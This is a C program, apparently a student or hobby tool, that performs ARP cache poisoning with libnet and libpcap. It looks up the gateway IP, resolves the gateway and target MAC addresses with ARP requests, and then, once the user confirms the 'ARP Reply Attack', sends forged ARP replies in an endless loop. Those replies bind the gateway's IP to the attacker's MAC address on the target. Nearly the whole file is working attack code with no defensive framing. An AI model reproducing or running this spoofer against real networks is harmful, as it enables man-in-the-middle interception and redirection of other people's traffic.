#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdint.h>
#include <pcap.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>

/* ARP Header, (assuming Ethernet+IPv4)            */
#define ARP_REQUEST 1   /* ARP Request             */
#define ARP_REPLY 2     /* ARP Reply               */
    typedef struct arphdr
{
  u_int16_t htype;             /* Hardware Type           */
  u_int16_t ptype;             /* Protocol Type           */
  u_char hlen;                 /* Hardware Address Length */
  u_char plen;                 /* Protocol Address Length */
  u_int16_t oper;              /* Operation Code          */
  u_char sha[6];               /* Sender hardware address */
  u_char spa[4];               /* Sender IP address       */
  u_char tha[6];               /* Target hardware address */
  u_char tpa[4];               /* Target IP address       */
} arphdr_t;

#define MAXBYTES2CAPTURE 2048
unsigned char mac_tar_addr[7];
char gateway_ip_addr_str[16];
void send_arp_reply (char target_ip_addr_str[16])
{
  libnet_t * l;                /* the libnet context */
  char errbuf[LIBNET_ERRBUF_SIZE];
  u_int32_t src_ip_addr, target_ip_addr;
  u_int8_t mac_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
            mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
            mac_src_addr[6];
  struct libnet_ether_addr *src_mac_addr;
  int bytes_written;//wirete packet

  /* reset function */
  l = libnet_init (LIBNET_LINK, NULL, errbuf);
  if (l == NULL)
    {
      fprintf (stderr, "libnet_init() failed: %s\n", errbuf);
      exit (EXIT_FAILURE);
    }


      /* Getting gateway IP address */

  src_ip_addr = inet_addr(gateway_ip_addr_str);
  if (src_ip_addr == -1)
    {
      fprintf (stderr, "Couldn't get own IP address: %s\n",libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }
    /* get source MAC */
  src_mac_addr = libnet_get_hwaddr (l);
  if (src_mac_addr == NULL)
    {
      fprintf (stderr, "Couldn't get own MAC address: %s\n",libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }


      /* Getting target IP address */
      target_ip_addr = libnet_name2addr4 (l, target_ip_addr_str, LIBNET_DONT_RESOLVE);
    if (target_ip_addr == -1)
    {
      fprintf (stderr, "Error converting IP address.\n");
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Building ARP header */
      if (libnet_autobuild_arp
           (ARPOP_REPLY, src_mac_addr->ether_addr_octet,
            (u_int8_t *) (&src_ip_addr), mac_tar_addr,
            (u_int8_t *) (&target_ip_addr), l) == -1)

    {
      fprintf (stderr, "Error building ARP header: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Building Ethernet header */
      if (libnet_autobuild_ethernet (mac_tar_addr, ETHERTYPE_ARP, l) ==
           -1)

    {
      fprintf (stderr, "Error building Ethernet header: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Writing packet */
      while (1)

    {
      bytes_written = libnet_write (l);
      if (bytes_written != -1)
        printf ("%d bytes written.\n", bytes_written);

      else
        fprintf (stderr, "Error writing packet: %s\n",
                  libnet_geterror (l));
      bytes_written = libnet_write (l);

          //libnet_destroy(l);
          sleep (3);
      printf ("next\n");
    }
}
void send_arp_reqest (char target_ip_addr_str[16], int a)
{
  libnet_t * l;                /* the libnet context */
  char errbuf[LIBNET_ERRBUF_SIZE];
  u_int32_t src_ip_addr, target_ip_addr;
  u_int8_t mac_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
            mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
            mac_src_addr[6];
  struct libnet_ether_addr *src_mac_addr;
  int bytes_written;//wirete packet

  /* reset function */
  l = libnet_init (LIBNET_LINK, NULL, errbuf);
  if (l == NULL)
    {
      fprintf (stderr, "libnet_init() failed: %s\n", errbuf);
      exit (EXIT_FAILURE);
    }

      /* Getting our own MAC and IP addresses */
      src_ip_addr = libnet_get_ipaddr4 (l);
  if (src_ip_addr == -1)
    {
      fprintf (stderr, "Couldn't get own IP address: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }
  src_mac_addr = libnet_get_hwaddr (l);
  if (src_mac_addr == NULL)
    {
      fprintf (stderr, "Couldn't get own IP address: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Getting target IP address */
    if (a==0)
    {
      target_ip_addr = libnet_name2addr4 (l, target_ip_addr_str, LIBNET_DONT_RESOLVE);
    }else{
      target_ip_addr = inet_addr(target_ip_addr_str);
    }

  if (target_ip_addr == -1)
    {
      fprintf (stderr, "Error converting IP address.\n");
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Building ARP header */
      if (libnet_autobuild_arp
           (ARPOP_REQUEST, src_mac_addr->ether_addr_octet,
            (u_int8_t *) (&src_ip_addr), mac_zero_addr,
            (u_int8_t *) (&target_ip_addr), l) == -1)

    {
      fprintf (stderr, "Error building ARP header: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Building Ethernet header */
      if (libnet_autobuild_ethernet
           (mac_broadcast_addr, ETHERTYPE_ARP, l) == -1)

    {
      fprintf (stderr, "Error building Ethernet header: %s\n",
                libnet_geterror (l));
      libnet_destroy (l);
      exit (EXIT_FAILURE);
    }

      /* Writing packet */
      bytes_written = libnet_write (l);
  if (bytes_written != -1)
    printf ("   %d bytes written.\n", bytes_written);

  else
    fprintf (stderr, "Error writing packet: %s\n", libnet_geterror (l));
  bytes_written = libnet_write (l);

      //libnet_destroy(l);
      //recive_and_print
  int i = 0;
  char *dev;                   /* name of the device to use */
  bpf_u_int32 netaddr = 0, mask = 0;   /* To Store network address and netmask   */
  struct bpf_program filter;   /* Place to store the BPF filter program  */
  char errbuff[PCAP_ERRBUF_SIZE];      /* Error buffer                           */
  pcap_t * descr = NULL;       /* Network interface handler              */
  struct pcap_pkthdr pkthdr;   /* Packet information (timestamp,size...) */
  const unsigned char *packet = NULL;  /* Received raw data                      */
  arphdr_t * arpheader = NULL; /* Pointer to the ARP header              */
  memset (errbuff, 0, PCAP_ERRBUF_SIZE);
  dev = pcap_lookupdev (errbuf);
  printf ("\n\n    Start capture packet \n\n");

      /* error checking */
      if (dev == NULL)

    {
      printf ("%s\n", errbuf);
      exit (1);
    }

      /* Open network device for packet capture */
      if ((descr =
           pcap_open_live (dev, MAXBYTES2CAPTURE, 0, 512, errbuf)) == NULL)
    {
      fprintf (stderr, "ERROR: %s\n", errbuf);
      exit (1);
    }

      /* Look up info from the capture device. */
      if (pcap_lookupnet (dev, &netaddr, &mask, errbuf) == -1)
    {
      fprintf (stderr, "ERROR: %s\n", errbuf);
      exit (1);
    }

      /* Compiles the filter expression into a BPF filter program */
      if (pcap_compile (descr, &filter, "arp", 1, mask) == -1)
    {
      fprintf (stderr, "ERROR: %s\n", pcap_geterr (descr));
      exit (1);
    }

      /* Load the filter program into the packet capture device. */
      if (pcap_setfilter (descr, &filter) == -1)
    {
      fprintf (stderr, "ERROR: %s\n", pcap_geterr (descr));
      exit (1);
    }
  int t = 1;
  while (t <= 5)

    {
      t++;
      bytes_written = libnet_write (l);
      if ((packet = pcap_next (descr, &pkthdr)) == NULL)

        {                       /* Get one packet */
          fprintf (stderr, "ERROR: Error getting the packet.\n", errbuf);

              //exit(1);
        }
      arpheader = (struct arphdr *) (packet + 14);    /* Point to the ARP header */
      if ((ntohs (arpheader->oper) != ARP_REQUEST))

        {
          t = 10;
        }
    }


      if (ntohs (arpheader->htype) == 1
          && ntohs (arpheader->ptype) == 0x0800)

    {
      if(a==0)
      {
          printf ("  Target ip : %s\n", target_ip_addr_str);
          printf ("  Target MAC : ");
       }
      else
      {
          printf ("  Gateway ip : %s", target_ip_addr_str);
          printf ("  Gateway MAC : ");
      }
      int i = 0;
      for (i = 0; i < 6; i++)

        {
          printf ("%02X", arpheader->sha[i]);
          mac_tar_addr[i] = arpheader->sha[i];
          if (i == 5)

            {
              break;
            }

          else

            {
              printf (":");
            }
        }
      printf ("\n\n\n");

          /* If is Ethernet and IPv4, print packet contents */
          //form(arpheader);
    }

      //  return mac_tar_addr;
}
void make ()//gateway getter
{
  libnet_t * l;
  FILE * fp;
  fp = popen ("(ip route | head -n 1 | cut -d' ' -f3) ", "r");
  if (NULL == fp)

    {
      perror ("popen() 실패");
      return;
    }
  while (fgets (gateway_ip_addr_str, 16, fp))
      printf ("\n   gateway is %s", gateway_ip_addr_str);
  pclose (fp);



}
void form (arphdr_t * arpheader) //print from
{
  struct pcap_pkthdr pkthdr;
  pkthdr;
  int i = 0;
  printf ("\n\nReceived Packet Size: %d bytes\n", pkthdr.len);
  printf ("Hardware type: %s\n",
           (ntohs (arpheader->htype) == 1) ? "Ethernet" : "Unknown");
  printf ("Protocol type: %s\n",
           (ntohs (arpheader->ptype) == 0x0800) ? "IPv4" : "Unknown");
  printf ("Operation: %s\n",
           (ntohs (arpheader->oper) ==
            ARP_REQUEST) ? "ARP Request" : "ARP Reply");

/* If is Ethernet and IPv4, print packet contents */
      if (ntohs (arpheader->htype) == 1
          && ntohs (arpheader->ptype) == 0x0800)

    {
      printf ("Sender MAC: ");
      for (i = 0; i < 6; i++)
        printf ("%02X:", arpheader->sha[i]);
      printf ("\nSender IP: ");
      for (i = 0; i < 4; i++)
        printf ("%d.", arpheader->spa[i]);
      printf ("\nTarget MAC: ");
      for (i = 0; i < 6; i++)
        printf ("%02X:", arpheader->tha[i]);
      printf ("\nTarget IP: ");
      for (i = 0; i < 4; i++)
        printf ("%d.", arpheader->tpa[i]);
      printf ("\n");
    }
}

main ()
{
  signal (SIGPIPE, SIG_IGN);
  char target_ip_addr_str[16] = { 0 };

      /* Getting target IP address */
      printf ("Target IP address: ");
  scanf ("%15s", target_ip_addr_str);
  printf ("\n Injection Successful target ip \n");


  make ();
  send_arp_reqest(gateway_ip_addr_str, 1);



  send_arp_reqest (target_ip_addr_str, 0);
    sleep(2);
  printf ("  send to target ARP Reply Attack gone (Y:N)? ");
  char choice;
  scanf (" %c", &choice);

  if (choice == 'N' | choice == 'n')

    {
      printf ("\n  ========== END ================\n");
      return 0;
    }

  else

    {
      if (choice == 'Y' | choice == 'y')

        {

          send_arp_reply (target_ip_addr_str);
        }

      else

        {
          printf ("Don't understand commend\n tool exit");
          return 0;
        }
    }
}


